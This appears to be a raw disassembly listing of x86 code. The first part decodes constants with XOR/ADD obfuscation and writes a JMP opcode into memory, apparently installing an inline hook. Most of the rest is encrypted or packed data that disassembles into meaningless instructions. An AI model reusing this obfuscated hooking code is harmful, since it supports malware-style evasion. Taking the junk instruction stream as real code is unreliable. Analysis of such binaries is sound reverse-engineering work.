  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	fsub   st,st(6)
  415960:	push   esi
  415961:	lods   al,BYTE PTR ds:[esi]
  415962:	ins    DWORD PTR es:[edi],dx
  415963:	adc    BYTE PTR [edi+0x78],bh
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x415931
  41596b:	mov    ?,WORD PTR [eax+0x5f]
  41596e:	push   es
  41596f:	std    
  415970:	jmp    0x41593e
  415972:	rol    BYTE PTR [ebp-0x46413fe6],1
  415978:	sbb    eax,0x5df75fc8
  41597d:	mov    dl,0xef
  41597f:	push   ebx
  415980:	push   es
  415981:	xor    bl,BYTE PTR [esi-0x60]
  415984:	rcl    BYTE PTR ds:0x7d255ef1,cl
  41598a:	push   ecx
  41598b:	xor    eax,0x59c0c295
  415990:	xor    ch,BYTE PTR ds:0xf4b7d110
  415996:	pop    ss
  415997:	ficom  WORD PTR ds:0xd597599d
  41599d:	add    BYTE PTR [esi+0x35333e4d],cl
  4159a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159a4:	mov    DWORD PTR [eax-0x2c],edi
  4159a7:	mov    ds:0x5b03325e,eax
  4159ac:	test   ah,0x50
  4159af:	lahf   
  4159b0:	and    al,0xb1
  4159b2:	les    esp,FWORD PTR [ebp+0x5f]
  4159b5:	jae    0x415a29
  4159b7:	mov    edx,0xb6853483
  4159bc:	sbb    BYTE PTR [edi+edx*2+0x73a35683],cl
  4159c3:	jl     0x415a2d
  4159c5:	out    0x46,al
  4159c7:	fimul  DWORD PTR [eax]
  4159c9:	jae    0x415a17
  4159cb:	add    DWORD PTR [esi-0x5f],ecx
  4159ce:	push   ecx
  4159cf:	jae    0x415a1c
  4159d1:	sahf   
  4159d2:	in     al,dx
  4159d3:	push   edi
  4159d4:	hlt    
  4159d5:	loop   0x415a0c
  4159d7:	dec    ecx
  4159d8:	pushf  
  4159d9:	pop    ds
  4159da:	lea    edx,[edx]
  4159dc:	cli    
  4159dd:	or     eax,0xcae1cf03
  4159e2:	inc    ebp
  4159e3:	xor    DWORD PTR [edx+0x45],eax
  4159e6:	jo     0x4159be
  4159e8:	add    al,0x14
  4159ea:	xchg   edx,eax
  4159eb:	xchg   esi,eax
  4159ec:	es rcl ch,cl
  4159ef:	xchg   esi,eax
  4159f0:	or     dh,BYTE PTR [eax+0x9]
  4159f3:	sti    
  4159f4:	jge    0x4159b7
  4159f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159f7:	popa   
  4159f8:	icebp  
  4159f9:	push   ebx
  4159fa:	mov    gs,WORD PTR [edx-0x46be3df1]
  415a00:	test   edi,0xde932b9d
  415a06:	adc    BYTE PTR [edi],ch
  415a08:	jnp    0x4159cd
  415a0a:	(bad)  
  415a0b:	iret   
  415a0c:	rcr    BYTE PTR [ebp-0xc],cl
  415a0f:	lods   al,BYTE PTR ds:[esi]
  415a10:	adc    eax,0xc3b3786d
  415a15:	lahf   
  415a16:	mov    ss,WORD PTR [eax]
  415a18:	xor    BYTE PTR [edi+0x6528c270],al
  415a1e:	dec    esp
  415a1f:	inc    esi
  415a20:	push   0x5ca16303
  415a25:	cmp    DWORD PTR [ebp+0x7a],edx
  415a28:	inc    esi
  415a29:	ja     0x415a63
  415a2b:	fmul   DWORD PTR [ebx+0x471801f]
  415a31:	add    al,0x43
  415a33:	or     ah,bh
  415a35:	je     0x415a68
  415a37:	stos   DWORD PTR es:[edi],eax
  415a38:	push   edx
  415a39:	or     al,0xcc
  415a3b:	aaa    
  415a3c:	xchg   esp,eax
  415a3d:	mov    eax,ds:0x62f6d0d2
  415a42:	pop    ebp
  415a43:	sub    esp,DWORD PTR [esi+0x1b]
  415a46:	test   eax,0x14c695c9
  415a4b:	xor    ebp,edx
  415a4d:	bound  eax,QWORD PTR [esi+0x3c7af6f3]
  415a53:	retf   
  415a54:	inc    eax
  415a55:	cmp    al,0x7c
  415a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a58:	dec    edi
  415a59:	adc    esi,esp
  415a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a5c:	mov    ecx,0x8dbf705b
  415a61:	add    DWORD PTR [esi],eax
  415a63:	int3   
  415a64:	pop    edi
  415a65:	shl    DWORD PTR [eax+eiz*2+0x1e],1
  415a69:	fild   DWORD PTR [edi+0x79b09cb0]
  415a6f:	inc    esp
  415a70:	into   
  415a71:	test   DWORD PTR [eax-0x13],ebx
  415a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a75:	inc    esi
  415a76:	lock aad 0xc
  415a79:	push   ss
  415a7a:	jns    0x415a76
  415a7c:	mov    bl,0xc9
  415a7e:	pop    ebp
  415a7f:	inc    esi
  415a80:	cmp    BYTE PTR [ebp+0x5d6ebac3],bl
  415a86:	das    
  415a87:	fadd   QWORD PTR [ebx-0x52]
  415a8a:	sub    BYTE PTR [edi-0x7fd5d97f],dl
  415a90:	stos   DWORD PTR es:[edi],eax
  415a91:	in     al,0xe7
  415a93:	cmp    BYTE PTR [ebx-0x3f6fd914],cl
  415a99:	js     0x415aab
  415a9b:	add    BYTE PTR [eax-0x69],bh
  415a9e:	jno    0x415a29
  415aa0:	gs aas 
  415aa2:	adc    ch,BYTE PTR [edx]
  415aa4:	cmp    edx,DWORD PTR [eax+0x34136363]
  415aaa:	cs sbb eax,0x55f0fea0
  415ab0:	cmc    
  415ab1:	test   eax,0x8f7c766a
  415ab6:	xchg   edi,eax
  415ab7:	push   0xf
  415ab9:	adc    al,0xae
  415abb:	fwait
  415abc:	push   esi
  415abd:	les    si,DWORD PTR [ebx]
  415ac0:	dec    edx
  415ac1:	dec    edx
  415ac2:	add    BYTE PTR [edx+edx*4],dh
  415ac5:	call   0x8e11:0xc2d55fa9
  415acc:	test   eax,0x9378660b
  415ad1:	int3   
  415ad2:	cmp    eax,0x93fd0aa9
  415ad7:	jbe    0x415a67
  415ad9:	sub    bh,cl
  415adb:	mov    ah,0x7
  415add:	stos   BYTE PTR es:[edi],al
  415ade:	in     al,dx
  415adf:	mov    ecx,0xdaf4764b
  415ae4:	ins    DWORD PTR es:[edi],dx
  415ae5:	pop    ebx
  415ae6:	inc    ebx
  415ae7:	cmp    BYTE PTR [eax+0x4b],bh
  415aea:	loopne 0x415b66
  415aec:	xor    DWORD PTR [edx],eax
  415aee:	push   eax
  415aef:	sar    edi,cl
  415af1:	push   ss
  415af2:	push   0xffffffe0
  415af4:	mov    eax,ds:0x58c46986
  415af9:	aas    
  415afa:	into   
  415afb:	xchg   ebp,eax
  415afc:	dec    eax
  415afd:	fisttp DWORD PTR [ebp-0x4d910e6]
  415b03:	or     BYTE PTR [esi-0x52],dl
  415b06:	add    eax,ecx
  415b08:	popf   
  415b09:	or     ah,al
  415b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b0c:	cs out 0xc6,al
  415b0f:	mov    BYTE PTR [esi],dh
  415b11:	jo     0x415b58
  415b13:	mov    al,ds:0xd8f2b718
  415b18:	dec    esi
  415b19:	into   
  415b1a:	inc    dl
  415b1c:	in     al,dx
  415b1d:	pop    esi
  415b1e:	in     al,dx
  415b1f:	mov    dl,0xd3
  415b21:	lds    ecx,FWORD PTR [esi-0x24]
  415b24:	call   0xc45a:0xef22aea6
  415b2b:	lods   eax,DWORD PTR ds:[esi]
  415b2c:	inc    ecx
  415b2d:	jae    0x18b57239
  415b33:	push   ds
  415b34:	sub    al,0x22
  415b36:	inc    eax
  415b37:	gs mov bl,0x64
  415b3a:	push   edx
  415b3b:	loope  0x415afb
  415b3d:	lds    edi,FWORD PTR [esi]
  415b3f:	push   es
  415b40:	cmc    
  415b41:	in     al,0xc1
  415b43:	sbb    bl,BYTE PTR [ebx+0x58]
  415b46:	mov    bh,0x62
  415b48:	jno    0x415b61
  415b4a:	(bad)  
  415b4b:	cli    
  415b4c:	retf   0x9c35
  415b4f:	inc    edi
  415b50:	cld    
  415b51:	fld    QWORD PTR ss:[eax-0x55]
  415b55:	mov    edx,DWORD PTR [edx]
  415b57:	pusha  
  415b58:	loop   0x415b1f
  415b5a:	push   es
  415b5b:	inc    edi
  415b5c:	xlat   BYTE PTR ds:[ebx]
  415b5d:	inc    ebx
  415b5e:	(bad)  
  415b60:	call   0x2fa2:0xac85f5d0
  415b67:	loope  0x415bce
  415b69:	fisub  WORD PTR [ebp+ecx*2-0x39]
  415b6d:	mov    ss:0xcde461cf,eax
  415b73:	jo     0x415afd
  415b75:	xor    eax,0x37a77a02
  415b7a:	fwait
  415b7b:	adc    ebx,DWORD PTR [edx-0x12e1209c]
  415b81:	ins    BYTE PTR es:[edi],dx
  415b82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b83:	repz stc 
  415b85:	adc    dl,al
  415b87:	loope  0x415b5a
  415b89:	inc    edx
  415b8a:	test   eax,0xa780f807
  415b8f:	push   edi
  415b90:	jmp    0x415b76
  415b92:	push   cs
  415b93:	sbb    DWORD PTR [edi+esi*2],ebx
  415b96:	xor    bh,ah
  415b98:	aas    
  415b99:	es mov dl,0xe1
  415b9c:	cmp    DWORD PTR [edx],eax
  415b9e:	mov    edi,0xb2c7633e
  415ba3:	(bad)  
  415ba4:	gs nop
  415ba6:	push   es
  415ba7:	jns    0x415c0a
  415ba9:	fdivr  QWORD PTR [esi-0x1a]
  415bac:	fbstp  TBYTE PTR [edx-0x48]
  415baf:	mov    ecx,0xffae570
  415bb4:	add    ebp,ebx
  415bb6:	xor    eax,0xfde409a9
  415bbb:	out    dx,al
  415bbc:	cmc    
  415bbd:	xchg   esi,eax
  415bbe:	outs   dx,BYTE PTR ds:[esi]
  415bbf:	sti    
  415bc0:	test   eax,0x71c9f88e
  415bc5:	cmc    
  415bc6:	add    al,0x51
  415bc8:	pop    ecx
  415bc9:	add    dh,BYTE PTR [edx+0x30]
  415bcc:	mov    BYTE PTR [ebp+0x48],al
  415bcf:	ret    0xac95
  415bd2:	call   0x7549:0x904cbb0
  415bd9:	cld    
  415bda:	aaa    
  415bdb:	into   
  415bdc:	jno    0x415c39
  415bde:	in     eax,0x82
  415be0:	push   esp
  415be1:	mov    ch,0x9a
  415be3:	lock dec esi
  415be5:	pop    ds
  415be6:	push   cs
  415be7:	pop    ebx
  415be8:	cmp    BYTE PTR [edx],ch
  415bea:	mov    edx,0x9b4fe29
  415bef:	push   esi
  415bf0:	mov    edx,0x6df46b61
  415bf5:	or     DWORD PTR [ecx+eax*4],ebp
  415bf8:	push   cs
  415bf9:	push   edx
  415bfa:	test   eax,0x4e7741b4
  415bff:	cmp    eax,0xba7d9c6c
  415c04:	and    eax,0x5c75151
  415c09:	cmc    
  415c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c0b:	inc    edx
  415c0c:	add    BYTE PTR [eax],dl
  415c0e:	adc    BYTE PTR [eax],al
  415c10:	add    BYTE PTR [eax-0x7637ac7],bh
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	pop    ds
  415c40:	push   ss
  415c41:	imul   BYTE PTR [esi]
  415c43:	mov    dl,BYTE PTR ds:0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	and    eax,0xacfbcf87
  415c50:	shl    BYTE PTR [edx-0x5e],cl
  415c53:	or     DWORD PTR [ecx+0x750cfa51],ebp
  415c59:	push   ebx
  415c5a:	jecxz  0x415ccd
  415c5c:	sub    dh,BYTE PTR [edx+0x46]
  415c5f:	sub    eax,0xf6f445f0
  415c64:	ss data16 in al,dx
  415c67:	inc    eax
  415c68:	ret    
  415c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c6a:	pushf  
  415c6b:	push   edi
  415c6c:	and    eax,0xb006c66b
  415c71:	cmp    ah,al
  415c73:	rcl    DWORD PTR [ecx],cl
  415c75:	pop    ds
  415c76:	jmp    0x34aef2c6
  415c7b:	call   FWORD PTR [eax-0x72d8d20d]
  415c81:	xchg   ebx,eax
  415c82:	add    DWORD PTR [edx+0x25],esp
  415c85:	sbb    DWORD PTR [edi-0x6],0x7791400a
  415c8c:	daa    
  415c8d:	cmc    
  415c8e:	enter  0x8aa8,0x60
  415c92:	test   eax,0x28f2b400
  415c97:	std    
  415c98:	sbb    edi,eax
  415c9a:	fsub   QWORD PTR [ecx]
  415c9c:	popa   
  415c9d:	dec    eax
  415c9e:	(bad)  
  415c9f:	enter  0x1b40,0x4b
  415ca3:	ins    BYTE PTR es:[edi],dx
  415ca4:	inc    esp
  415ca5:	inc    esi
  415ca6:	gs lock fwait
  415ca9:	popf   
  415caa:	xchg   esp,eax
  415cab:	mov    ds:0xa724f00b,eax
  415cb0:	ds push eax
  415cb2:	sub    BYTE PTR ds:0x3d15f89a,0x12
  415cb9:	dec    edi
  415cba:	xchg   edx,eax
  415cbb:	nop
  415cbc:	pop    es
  415cbd:	mov    ebx,0xcd35dee1
  415cc2:	shr    edx,1
  415cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc6:	jmp    0x8ad2:0xc2af332e
  415ccd:	pop    ss
  415cce:	sahf   
  415ccf:	rol    ah,1
  415cd1:	inc    edi
  415cd2:	mov    ebx,0x854aff5b
  415cd7:	jge    0x415d40
  415cd9:	xor    ebp,ecx
  415cdb:	mov    edi,0xe19badb7
  415ce0:	xchg   edx,eax
  415ce1:	mov    cl,0x2f
  415ce3:	mov    eax,ds:0x75609dbf
  415ce8:	sti    
  415ce9:	dec    eax
  415cea:	dec    eax
  415ceb:	enter  0x355b,0xb9
  415cef:	out    dx,eax
  415cf0:	mov    ds:0xeb7d3a15,al
  415cf5:	jnp    0x415c8a
  415cf7:	shl    edi,cl
  415cf9:	push   ecx
  415cfa:	bound  esi,QWORD PTR [eax-0x61]
  415cfd:	jl     0x415d58
  415cff:	mov    al,0xac
  415d01:	mov    edi,0x6d08479a
  415d06:	push   ecx
  415d07:	sub    al,0x63
  415d09:	nop
  415d0a:	cwde   
  415d0b:	mov    ebp,0xbf0fc1
  415d10:	ss push edx
  415d12:	cli    
  415d13:	adc    eax,0xaa2fbe52
  415d18:	test   eax,0x78476f08
  415d1d:	dec    eax
  415d1e:	jno    0x415ca0
  415d20:	and    BYTE PTR [esi-0x726a0386],bh
  415d26:	retf   
  415d27:	xor    bl,BYTE PTR ds:0xfeb1ce16
  415d2d:	pop    eax
  415d2e:	xchg   ebp,eax
  415d2f:	lea    ebx,ds:0xa526119d
  415d35:	inc    ebp
  415d36:	call   0xa500a4e1
  415d3b:	ins    BYTE PTR es:[edi],dx
  415d3c:	imul   edx,DWORD PTR [ebp-0x23b6d440],0x6
  415d43:	(bad)  
  415d44:	jae    0x415cef
  415d46:	cdq    
  415d47:	xchg   edi,eax
  415d48:	mov    esi,0x433b2e78
  415d4d:	adc    dh,dh
  415d4f:	adc    bh,BYTE PTR [edi+0x19]
  415d52:	dec    eax
  415d53:	ins    DWORD PTR es:[edi],dx
  415d54:	stos   DWORD PTR es:[edi],eax
  415d55:	and    ebp,esi
  415d57:	and    esi,DWORD PTR [ebp+0x71]
  415d5a:	add    ebx,DWORD PTR [eax+0x4b]
  415d5d:	in     eax,dx
  415d5e:	fimul  WORD PTR [ebx]
  415d60:	push   edi
  415d61:	sbb    eax,0xb91ff3d8
  415d66:	and    cl,dh
  415d68:	bound  edx,QWORD PTR [edx+0x3c63a118]
  415d6e:	pushf  
  415d6f:	mov    edi,0xfda50ed0
  415d74:	int3   
  415d75:	push   es
  415d76:	cmp    bl,0xea
  415d79:	push   cs
  415d7a:	outs   dx,DWORD PTR ds:[esi]
  415d7b:	xor    BYTE PTR ds:0xd13b7b96,ah
  415d81:	xor    dl,ah
  415d83:	xor    ch,BYTE PTR [ecx]
  415d85:	mov    eax,ds:0xc807ad6d
  415d8a:	ins    DWORD PTR es:[edi],dx
  415d8b:	and    BYTE PTR [ebx+0x23],al
  415d8e:	daa    
  415d8f:	(bad)  [eax+0x57]
  415d92:	xchg   ecx,eax
  415d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d94:	ins    DWORD PTR es:[edi],dx
  415d95:	aam    0x65
  415d97:	push   ebx
  415d98:	pop    ebp
  415d99:	xlat   BYTE PTR ds:[ebx]
  415d9a:	xor    BYTE PTR [ecx],ch
  415d9c:	pop    edx
  415d9d:	ins    BYTE PTR es:[edi],dx
  415d9e:	std    
  415d9f:	mov    DWORD PTR [edx+ebp*8-0x3a],edi
  415da3:	or     BYTE PTR [edi+0x1c4ba766],bl
  415da9:	cli    
  415daa:	xchg   ecx,eax
  415dab:	mov    ds:0xe2fa00b2,al
  415db0:	mov    al,0xc6
  415db2:	rcl    ecx,0x2e
  415db5:	sbb    dh,BYTE PTR [esi-0xd]
  415db8:	dec    ebp
  415db9:	sub    al,0x4f
  415dbb:	repnz xchg edi,eax
  415dbd:	outs   dx,BYTE PTR ds:[esi]
  415dbe:	adc    esi,eax
  415dc0:	mov    ecx,0xbe444eb6
  415dc5:	mov    DWORD PTR [eax+0x225f86b6],0x2564f757
  415dcf:	enter  0xd55f,0xbe
  415dd3:	cmovp  esp,esi
  415dd6:	lods   al,BYTE PTR ds:[esi]
  415dd7:	push   esi
  415dd8:	int    0xed
  415dda:	add    al,0x59
  415ddc:	mov    bl,0x87
  415dde:	xor    ebp,0x59
  415de1:	jns    0x415d8c
  415de3:	js     0x415dce
  415de5:	sbb    BYTE PTR [ecx+ebx*1-0x3888614c],dl
  415dec:	dec    ebx
  415ded:	jne    0x415df1
  415def:	or     al,0x65
  415df1:	xor    dh,bh
  415df3:	push   ecx
  415df4:	sbb    DWORD PTR [ecx-0x3e],eax
  415df7:	out    0x6a,al
  415df9:	adc    BYTE PTR [ebp+0x69],0x7c
  415dfd:	je     0x415dcd
  415dff:	xchg   ebx,eax
  415e00:	cli    
  415e01:	xchg   esi,eax
  415e02:	jo     0x415e3c
  415e04:	cs pop ebx
  415e06:	loope  0x415ddf
  415e08:	out    dx,eax
  415e09:	and    eax,0xc9914e30
  415e0e:	inc    eax
  415e0f:	xchg   edx,eax
  415e10:	test   eax,0x8a29b0a3
  415e15:	add    al,0xee
  415e17:	pop    edx
  415e18:	add    ch,dh
  415e1a:	test   eax,0x66aaeb83
  415e1f:	rcl    DWORD PTR [ebp-0x12],1
  415e22:	inc    ebp
  415e23:	fadd   QWORD PTR [edx-0x55473984]
  415e29:	ret    
  415e2a:	sbb    al,0xfe
  415e2c:	or     eax,0x6b4ed532
  415e31:	xchg   BYTE PTR [ebp+0x7c],dh
  415e34:	cmp    dl,0x81
  415e37:	hlt    
  415e38:	jne    0x415e61
  415e3a:	dec    ecx
  415e3b:	loope  0x415e53
  415e3d:	and    cl,0xda
  415e40:	scas   eax,DWORD PTR es:[edi]
  415e41:	xchg   ebp,eax
  415e42:	stc    
  415e43:	popa   
  415e44:	dec    esi
  415e45:	js     0x415e49
  415e47:	aaa    
  415e48:	imul   esi,DWORD PTR [esi],0x913ac36d
  415e4e:	sbb    bh,dh
  415e50:	adc    ecx,DWORD PTR [ecx+0x61]
  415e53:	adc    bl,0xf7
  415e56:	cmp    eax,0xd8725743
  415e5b:	call   DWORD PTR [ebx+eax*2-0x4f]
  415e5f:	mov    gs,edi
